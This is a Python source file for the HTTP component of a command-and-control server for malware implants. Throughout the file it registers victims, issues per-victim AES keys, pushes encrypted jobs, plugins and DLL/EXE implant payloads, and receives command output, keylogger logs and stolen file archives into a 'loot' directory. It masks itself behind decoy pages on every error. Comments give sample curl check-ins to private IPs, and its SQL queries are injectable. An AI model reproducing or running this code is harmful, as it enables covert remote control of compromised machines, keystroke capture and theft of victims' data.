#!/usr/bin/env/python
# -*- coding: utf-8


"""
HTTP Class
;;;;;;;;;;

Classes : 
	Kthread() - Create Thread for http flask server
	ServerManager() - Http Server Manager. Responsible from initiating server to implant communication. 

Functions :
	ServerRun() 			- Start Server
	register() 				- Register Victim
	Servjobs()				- Drop Jobs on implant
	ServPlugins()			- Drop plugins on implant
	ServPellets()			- Drop pellets on implant
	CommandResults()		- Receive job results from implant
	DownloadLoad()			- Landing Page for Loader File
	SrvMother()				- Serve Mother Implant. DLL/EXE.
	ErrorCodesCallback()	- Callbacks and Error Handler.

"""

from http.client import HTTPException
import threading,sys,os
import helper as he
import json
import c2_socks5
import logging
from distutils.util import strtobool
from flask import Flask, request, jsonify, make_response,send_file,Response
from support import database
from support.signatures import osArch
from support.libs.crypto.aes import aes
from support.signatures import callbackerrors
import configs
import io
import base64,codecs
from werkzeug.utils import secure_filename
from werkzeug.routing import RoutingException
from datetime import datetime
import zipfile

c2_config = configs.configuration.c2
flask_opt = configs.configuration.flask
victim_data={}
app = Flask(__name__)

class KThread(threading.Thread):
    """
    A subclass of threading.Thread, with a kill() method.
    From https://web.archive.org/web/20130503082442/http://mail.python.org/pipermail/python-list/2004-May/281943.html
    """

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run      # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True



#Class Handeling HTTP/S communications
class ServerManager:
	
	# Global Variables
	global victim_id

	def __init__(self):
		self.srv=c2_config['SRV_TYPE']
		self.Strict_Slashes = strtobool(flask_opt['STRICT_REDIRECT'])
		self.Merge_Slashes = strtobool(flask_opt['MERGE_SLASHES'])
		print ""


#Print error if in debug mode 
	def DbgSrv(self,e):
		if flask_opt['DEBUG_SRV'] == "TRUE":
			print "[ERROR : Server ] ",e
		else:
			pass
	
#Custom Response maker
	def ResponseMaker(self, data):
		resp = make_response(data)
		resp.headers['server']=self.srv
		return resp
#Serve Decoy on errors or to avoid leaking something
	def SrvDecoy(self):
		return open(os.getcwd()+"/"+c2_config['DECOY_PAGE'],"r").read()








##############################################################################################
#----------------------
#Server Thread Starter
#----------------------

#Func Parameters :
#	s -> c2 ip
#	p -> c2 port

	def ServerRun(self,s,p):
		log = logging.getLogger('werkzeug')
		log.setLevel(logging.ERROR)
		#logging.basicConfig(level=logging.DEBUG)

		@app.route('/', methods=['GET','POST'])
		def decoy():
			return self.ResponseMaker(self.SrvDecoy())

		@app.errorhandler(404)
		def not_found(error):
			self.DbgSrv(error)
			return self.ResponseMaker(self.SrvDecoy())
		
		@app.errorhandler(405)
		def MethodNotAllowed(error):
			self.DbgSrv(error)
			return self.ResponseMaker(self.SrvDecoy())

		@app.errorhandler(500)
		def internal_Server_error(error):
			self.DbgSrv(error)
			return self.ResponseMaker(self.SrvDecoy())
		
		@app.errorhandler(400)
		def Bad_Request(error):
			self.DbgSrv(error)
			return self.ResponseMaker(self.SrvDecoy())
		
		@app.errorhandler(401)
		def Unauthorized(error):
			self.DbgSrv(error)
			return self.ResponseMaker(self.SrvDecoy())
		
		@app.errorhandler(403)
		def Forbidden(error):
			self.DbgSrv(error)
			return self.ResponseMaker(self.SrvDecoy())
		
		@app.errorhandler(502)
		def Bad_Gateway(error):
			self.DbgSrv(error)
			return self.ResponseMaker(self.SrvDecoy())
		
		@app.errorhandler(503)
		def Service_Unavailable(error):
			self.DbgSrv(error)
			return self.ResponseMaker(self.SrvDecoy())
		
		@app.errorhandler(504)
		def Gateway_Timeout(error):
			self.DbgSrv(error)
			return self.ResponseMaker(self.SrvDecoy())
		


#400 401 403 502 503 504




##############################################################################################
#----------------------
# Register The Victim
#----------------------

#Path : 
#	/api/search
#parameters : 
# 	u -> username
# 	h -> hardware ID/HWID
#   j -> privilege level
#	y -> OS major and miner versions
#	k -> Architecture
#test:
#	curl -d "u=123&h=demo&j=1&y=Windows NT 4.0" -X POST http://172.16.199.128:8081/api/search
#   sample response:
#
#				 Break				Break			   Break
#				   |				  |					 |
#			       v				  v					 v
#			upqejy ! 799d3c44bad602ca ! 58702a38b4f66862 ! 32e82fed825fb53e
#			   ^               ^        	  ^			 		  ^	
#         	   |---------------|--------------|-------------------|
#			Victim ID     Communication   Plugin			   Pellet
#								Key			Key					Key



		@app.route('/api/search', methods=['GET','POST'],strict_slashes=self.Strict_Slashes,merge_slashes=self.Merge_Slashes)
		def register():
			try:
				if request.method == "GET":
					return self.ResponseMaker(self.SrvDecoy())
				elif request.method == "POST":
					username = request.form['u']
					hwid = request.form['h']
					privlevel = request.form['j']
					os = str(request.form['y'])
					victim_id= he.randomString()
					plugin_key = he.RandomKeysGeneratorAES(16)
					com_key=he.RandomKeysGeneratorAES(16)
					pellet_key=he.RandomKeysGeneratorAES(16)
					victim_arch = request.form['k']
					
					if victim_arch == "1":
						victim_arch="x86"
					elif victim_arch == "0":
						victim_arch="x64"
					else:
						victim_arch="Unknown Architecture"

					print ("\n[+] New Victim {0} Checked in.".format(victim_id))
					victim_data ['victim_ip'] = request.remote_addr
					victim_data ['victim_id'] = victim_id
					victim_data ['username'] = username
					victim_data ['hwid'] = hwid
					victim_data['Privileged'] = privlevel
					victim_data['Arch'] = victim_arch

					#Determine OS version and Get Windows OS 
					#if osArch.DetectOS(os) == "":
					#	os = "Unknown"
					#	victim_data['OS'] = os
					#else:
					#	os = ' '.join(osArch.DetectOS(os))
					#	victim_data['OS'] = os
					#print os
					# if "Windows" in request.headers.get('User-Agent'):
					# 	victim_data['victim_useragent'] = request.headers.get('User-Agent')
					# 	victim_data['OS'] = "Windows"
					# else : 
					# 	victim_data['victim_useragent'] = request.headers.get('User-Agent')
					# 	victim_data['OS'] = "Unknown"
					he.writeFile(victim_id+'.json','/victim_data/',str(victim_data))
					database.Victim().DBinsertVictimData(str(victim_id), str(request.remote_addr), str(username), str(hwid), str(os), str(privlevel),str(com_key),str(plugin_key),str(pellet_key), str(victim_arch))
					responseData = victim_id+" ! "+base64.b64encode(com_key)+" ! "+base64.b64encode(plugin_key)+" ! "+base64.b64encode(pellet_key)
					return self.ResponseMaker(responseData)
			
			except Exception as e:
				self.DbgSrv(e)
				return self.ResponseMaker(self.SrvDecoy())





##############################################################################################
#-------------------------
#	Set jobs for victims.
#--------------------------

#	Get Commands :    
#   	   Method : GET  http://<server>:<port>/<victim_id>/api/ic/  ===>           http://172.16.199.1:8081/ekxrzp/api/ic/
#      		 curl :  .\curl.exe http://172.16.199.1:8081/yqwmvo/api/ic/

#	The result must be like below example:
#             Break 
#               |               
#               v   
#      f_scoayu # MHgwMDQwMTBDMH4gXHg5MFx4OTA=
#         ^                 ^        
#         |-----------------|
#       Job-ID    encoded(encrypted) command alias & arguments


		@app.route('/<vic_id>/api/ic/',methods=['GET'],strict_slashes=self.Strict_Slashes,merge_slashes=self.Merge_Slashes)
		def Servjobs(vic_id):
			JobsList = []			
			if request.method == "GET":
				try:
					jobType_query = "SELECT jobID, jobtype FROM jobs WHERE victim =  '{0}';".format(vic_id)
					jobType_result = database.JobsTask().HTTPSrvfetchjobs(jobType_query)
					
					Comkey = "SELECT com_key FROM Victims WHERE id = '{0}';".format(vic_id)
					Comkey = database.DBCrypto().DBfetchComKeys(Comkey)

					JobInDb = [y for y in jobType_result]
					
					for i in JobInDb:
						enc = aes.AESCBC().encrypt(str(repr(' '.join(i[1::2]))), str(Comkey[0][0]))
						JobsList.append(' '.join(i[0::2]) +" # "+ enc+"<br>\n")
					return self.ResponseMaker(' '.join(JobsList))
				except Exception as e:
					self.DbgSrv(e)
					return self.ResponseMaker(self.SrvDecoy())
			else:
				return self.ResponseMaker(self.SrvDecoy())




##############################################################################################
#-------------------------------
#Host Plugin on Job assignment.
#-------------------------------

# Receive Plugins:
# Method : GET  http://<server>:<port>/<victim_id>/api/jf/<plugin_name>.f  ===>        http://172.16.199.1:8081/kycubo/api/jf/dante.f
	
		@app.route('/<vic_id>/api/jf/<plugin>',methods=['GET'],strict_slashes=self.Strict_Slashes,merge_slashes=self.Merge_Slashes)		
		def ServPlugins(vic_id,plugin):
			if request.method == "GET":
				try:
					path_query = "SELECT plugin_path FROM jobs WHERE victim = '{0}';".format(vic_id)
					plugin_path = database.JobsTask().HTTPSrvFetchPlugin(path_query)
					pluginKey = "SELECT plugins_key FROM Victims WHERE id = '{0}';".format(vic_id)
					pluginKey = database.DBCrypto().DBFetchPluginsKeys(pluginKey)
					#Checking if requested plugin name is in jobs  plugin_path
					#Writing reading plugin saved on disc 
					#Encrypting in memory Byte IO Stream  and finally returning as response
					#Saves Disc space you know lol
					if plugin in plugin_path[0][0]:
						#o = bytes(open(plugin_path[0][0],"rb+").read()) 
						with open(plugin_path[0][0],"rb") as o:
							o=o.read()
						memory_file = io.BytesIO()
						encryptPlugin = aes.AESCBC().encrypt(o, str(pluginKey[0][0]))
						memory_file.write(encryptPlugin.encode("utf-8"))
						memory_file.seek(0)
						pluginlen = str(len(encryptPlugin))
						response = make_response(send_file(memory_file, attachment_filename=plugin, as_attachment=True))
						response.headers['Content-Length'] = str(len(encryptPlugin))
						response.headers['server'] = self.srv
						return response
					else:
						return ""
				except Exception as e:
					self.DbgSrv(e)
					return self.ResponseMaker(self.SrvDecoy())
			else:
				return self.ResponseMaker(self.SrvDecoy())




##############################################################################################
#-------------------------------
#Host Pellets on Job assignment.
#-------------------------------
# Receive Pellets:
# Method : GET  http://<server>:<port>/<victim_id>/api/tp/<pellet_name>.j  ===>        http://172.16.199.1:8081/kycubo/api/tp/taurus.j
	
		@app.route('/<vic_id>/api/tp/<pellet>',methods=['GET'],strict_slashes=self.Strict_Slashes,merge_slashes=self.Merge_Slashes)		
		def ServPellet(vic_id,pellet):
			if request.method == "GET":
				try:
					path_query = "SELECT pellet_path FROM jobs WHERE victim = '{0}';".format(vic_id)
					pellet_path = database.JobsTask().HTTPSrvFetchPlugin(path_query)
					pelletKey = "SELECT pellet_key FROM Victims WHERE id = '{0}';".format(vic_id)
					pelletKey = database.DBCrypto().DBFetchPelletKeys(pelletKey)
					#Checking if requested pellet name is in jobs  pellet_path
					#Writing reading plugin saved on disc 
					#Encrypting in memory Byte IO Stream  and finally returning as response
					#Saves Disc space you know lol
					if pellet in pellet_path[0][0]:
						o = open(pellet_path[0][0],"rb").read() 
						memory_file = io.BytesIO()
						encryptPellet = aes.AESCBC().encrypt(str(o), str(pelletKey[0][0]))
						memory_file.write(b''+encryptPellet)
						memory_file.seek(0)
						response = make_response(send_file(memory_file, attachment_filename=pellet, as_attachment=True))
						response.headers['Content-Length'] = str(len(encryptPellet))
						response.headers['server'] = self.srv
						return response
					else:
						return ""
				except Exception as e:
					self.DbgSrv(e)
					return self.ResponseMaker(self.SrvDecoy())
			else:
				return self.ResponseMaker(self.SrvDecoy())



##############################################################################################
#---------------
# Host Mother 
#---------------
# i = 1 == DLL
# i = 0 == EXE
		@app.route('/api/cox',methods=['POST'],strict_slashes=self.Strict_Slashes,merge_slashes=self.Merge_Slashes)	
		def SrvMother():
			try:
				if request.method != "POST":
					print "[WARNING] Could be an Hack Attempt IP: ",request.remote_addr
					return self.SrvDecoy()
				
				else:
					binType = (request.form['i']).encode("utf-8")
					
					#Serve DLL
					if binType == "1":
						#return send_file(os.getcwd()+"/plugins/mother/mother.t",attachment_filename=he.randomString()+".t")
						response = make_response(send_file(os.getcwd()+"/plugins/mother/mother.t",attachment_filename=he.randomString()+".t"))
						response.headers['Content-Length'] = str(os.path.getsize(os.getcwd()+"/plugins/mother/mother.t"))
						response.headers['server'] = self.srv
						return response
					#Serve EXE
					elif binType == "0":
						#return send_file(os.getcwd()+"/plugins/mother/mother.n",attachment_filename=he.randomString()+".n")
						response = make_response(send_file(os.getcwd()+"/plugins/mother/mother.n",attachment_filename=he.randomString()+".n"))
						response.headers['Content-Length'] = str(os.path.getsize(os.getcwd()+"/plugins/mother/mother.t"))
						response.headers['server'] = self.srv
						return response
					else:
						print "[WARNING] Could be an External Hack Attempt from IP: ",request.remote_addr
						return self.ResponseMaker(self.SrvDecoy())
			
			except Exception as e:
				self.DbgSrv(e)
				return self.ResponseMaker(self.SrvDecoy())

##############################################################################################
#------------------------------
#Landing Page for Loader File.
#------------------------------
		@app.route('/<vic_id>/api/kl/<askedfile>',methods=['GET'],strict_slashes=self.Strict_Slashes,merge_slashes=self.Merge_Slashes)		
		def DownloadLoad(vic_id,askedfile):
			if request.method == "GET":
				try:
					path_query = "SELECT tempFiles FROM jobs WHERE victim = '{0}';".format(vic_id)
					TempFilePath = database.JobsTask().HTTPSrvFetchTempFilePath(path_query)
			
					if askedfile in TempFilePath[0][0]:
						response = make_response(send_file(TempFilePath[0][0],attachment_filename=askedfile))
						response.headers['Content-Length'] = str(os.path.getsize(TempFilePath[0][0]))
						response.headers['server'] = self.srv
						return response
					else:
						return ""
				except Exception as e:
					self.DbgSrv(e)
					return self.ResponseMaker(self.SrvDecoy())
			else:
				return self.ResponseMaker(self.SrvDecoy())



##############################################################################################
#-------------------------
#CallBack/Errors Results
#-------------------------
#ut= error ID
#example curl -d "ut=-84" -X POST http://192.168.1.5:8080/aeursq/api/tip/
		@app.route('/<vic_id>/api/tip/', methods=['POST'],strict_slashes=self.Strict_Slashes,merge_slashes=self.Merge_Slashes)
		def ErrorCodesCallback(vic_id):
			if request.method == "GET":
				return self.ResponseMaker(self.SrvDecoy())

			elif request.method == "POST":
				try:
					errorCode = str(request.form['ut']).encode("utf-8")
					errorCodeInspect = callbackerrors.matchError(errorCode)
					if errorCodeInspect != None:
						print "\n[Job Callback] : ",errorCodeInspect[0],errorCodeInspect[1]
						return self.ResponseMaker(self.SrvDecoy())
					else:
						print "\n[Job Callback] : ",errorCode, ": Undefined"
						return self.ResponseMaker(self.SrvDecoy())
				except Exception as e:
						self.DbgSrv(e)
						return self.ResponseMaker(self.SrvDecoy())
##############################################################################################
#-------------------------
#Job/Command Results
#-------------------------

#Send Results(updated) :    
#      Method : POST http://<server>:<port>/<victim_id>/api/fg/   ===>       http://172.16.199.1:8081/ekxrzp/api/fg/
# 		 curl : .\curl -d "browse=done&show=f_uwdsud&id=1" -X POST http://172.16.199.1:8081/ekxrzp/api/fg/

		@app.route('/<vic_id>/api/fg/', methods=['POST'],strict_slashes=self.Strict_Slashes,merge_slashes=self.Merge_Slashes)
		def CommandResults(vic_id):
			if request.method == "GET":
				return self.ResponseMaker(self.SrvDecoy())
			
			elif request.method == "POST":
					try:
						job_ID = request.form['show']
						data = request.form['browse']
						constency = (request.form['id']).replace("u'","").replace("'","")
						Comkey = "SELECT com_key FROM Victims WHERE id = '{0}';".format(vic_id)
						Comkey = database.DBCrypto().DBfetchComKeys(Comkey)

				#Add delimeter when finilazing the code		
						data= data.split(" <hr> ")
						iv = data[0]
						cipher=data[1]
						result = aes.AESCBC().decrypt(r''+cipher,r''+iv,str(Comkey[0][0]))
						result = "\n"+result.replace("u'","").replace("'","")+"\n"
				
				#Store results of actions in a log file.
						if c2_config['COLLECT_LOG']	== "TRUE":
							logFilePath = c2_config['LOG_FILE']
							with open(os.getcwd()+'/'+logFilePath,'a+') as f:
								formdata = """\n
==========================================================
Victim ID : {0}
Job ID : {1}

Results :
{2}
\n
								""".format(vic_id,job_ID,result)
								f.write(formdata)
				
				#Handle Constent buffer
						#Delete Job when complete data is sent 
						if constency == "3":
							print result	
							query_jobID = "DELETE FROM jobs WHERE jobID = '{0}'".format(job_ID)
							database.JobsTask().execute_query(query_jobID)

						#Do not delete job. Data is being received in chunks.
						elif constency == "4":
							print result
						
						else:
							print "[Error] Unknown Constency ID on receiving ID. Someone trying to pwn C2?"
						return self.ResponseMaker(self.SrvDecoy())
					except Exception as e:
						self.DbgSrv(e)
						return self.ResponseMaker(self.SrvDecoy())


##############################################################################################
#-------------------------
#Upload/Receive files
#-------------------------
		@app.route('/<vic_id>/api/ml/', methods=['POST'],strict_slashes=self.Strict_Slashes,merge_slashes=self.Merge_Slashes)
		def ReceiveFiles(vic_id):
			
			Comkey = "SELECT com_key FROM Victims WHERE id = '{0}';".format(vic_id)
			Comkey = database.DBCrypto().DBfetchComKeys(Comkey)
			
			if request.method == "GET":
				return self.ResponseMaker(self.SrvDecoy())
			
			elif request.method == "POST":
				save_path = os.getcwd()+'/loot/'+vic_id+'/'
				if os.path.exists(save_path) !=True:
					os.mkdir(save_path)

				app.config['UPLOAD_FOLDER']=save_path

				f = request.files['l']
				date_time = "{:%d-%m-%Y %H:%M:%S}".format(datetime.now())
				if ".tmp" in f.filename:
					ff = secure_filename(f.filename)
					data = f.read()
					print data
					data=data.replace(r"\n","").replace(r"\r","") 
					iv = data[:32] 
					result = aes.AESCBC().decrypt(r''+data[32:],r''+iv,str(Comkey[0][0]))
					open(os.path.join(app.config['UPLOAD_FOLDER'], ff.replace(".tmp",".log")+"_ "+date_time),"w+").write(result)
					print "\n[SERVER:INFO] Keylogger Logs saved to : ",app.config['UPLOAD_FOLDER']+(f.filename+"_ "+date_time).replace(".tmp",".log")
					return self.ResponseMaker(self.SrvDecoy())
				
				elif ".zz" in f.filename:
					ff = secure_filename(f.filename)
					o = open(app.config['UPLOAD_FOLDER']+ ff.replace(".zz",".zip"),"wb")
					o.write(f.read())
					print "\n[SERVER:INFO] Grabbed files saved to : ",app.config['UPLOAD_FOLDER']+(f.filename+"_ "+date_time).replace(".zz",".zip")
					return self.ResponseMaker(self.SrvDecoy())

				else:
					print "\n[OPSEC:WARNING] BREACH ATTEMPT - File {0} being uploaded from some external entity : {1}".format(f.filename,request.remote_addr)
					return self.ResponseMaker(self.SrvDecoy())
			else:
				return self.ResponseMaker(self.SrvDecoy())		
		app.run(threaded=True, host=s, port=p,debug=False)

